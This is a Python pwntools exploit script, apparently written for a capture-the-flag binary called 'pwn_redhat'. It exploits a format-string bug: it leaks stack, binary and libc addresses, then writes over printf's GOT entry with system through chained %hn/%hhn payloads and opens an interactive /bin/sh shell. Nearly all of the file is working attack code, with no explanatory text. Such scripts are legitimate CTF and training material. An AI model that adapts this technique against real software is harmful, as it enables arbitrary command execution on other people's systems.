#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./pwn_redhat")
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process("./pwn_redhat")
    #  io = process("./pwn_redhat_patch_printf")
    libc = elf.libc


else:
    io = remote("localhost", 9999)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


def DEBUG(cmd = ""):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

if __name__ == "__main__":
    #  DEBUG()
    io.sendlineafter(">>>", "%8$p..%9$p..%11$p..\0")
    elf.address = int(io.recvuntil("..", drop = True), 16) - 0x13C0
    success("elf.address -> {:#x}".format(elf.address))
    libc.address = int(io.recvuntil("..", drop = True), 16) - 241 - libc.sym[u'__libc_start_main']
    success("libc.address -> {:#x}".format(libc.address))
    stack = int(io.recvuntil("..", drop = True), 16) - 0xe8
    success("stack -> {:#x}".format(stack))
    #  pause()

    payload = "%{}c%{}$hn".format((stack + 0x28) & 0xffff, 0x5 + 6)
    payload += "%{}c%{}$hn".format(2, 0x13 + 6)
    #  DEBUG()
    io.sendlineafter(">>>", payload + '\0')

    payload = "%{}c%{}$hhn".format((elf.got['printf'] >> 16 & 0xff), 0x21 + 6)
    payload += "%{}c%{}$hn".format((elf.got['printf'] & 0xffff) - (elf.got['printf'] >> 16 & 0xff), 0x1f + 6)
    #  DEBUG()
    io.sendlineafter(">>>", payload + '\0')

    payload = "%{}c%{}$hn".format((stack + 0x40) & 0xffff, 0x5 + 6)
    payload += "%{}c%{}$hn".format(2, 0x13 + 6)
    #  DEBUG()
    io.sendlineafter(">>>", payload + '\0')

    payload = "%{}c%{}$hhn".format(((elf.got['printf'] + 2) >> 16 & 0xff), 0x21 + 6)
    payload += "%{}c%{}$hn".format(((elf.got['printf'] + 2) & 0xffff) - (elf.got['printf'] >> 16 & 0xff), 0x1f + 6)
    #  DEBUG()
    io.sendlineafter(">>>", payload + '\0')

    payload = "%{}c%{}$hhn".format(libc.sym['system'] >> 16 & 0xff, 0xa + 6)
    payload += "%{}c%{}$hn".format((libc.sym['system'] & 0xffff) - (libc.sym['system'] >> 16 & 0xff), 0x7 + 6)
    #  DEBUG()
    io.sendlineafter(">>>", payload + '\0')

    io.sendline("/bin/sh\0")
    io.interactive()
    io.close()
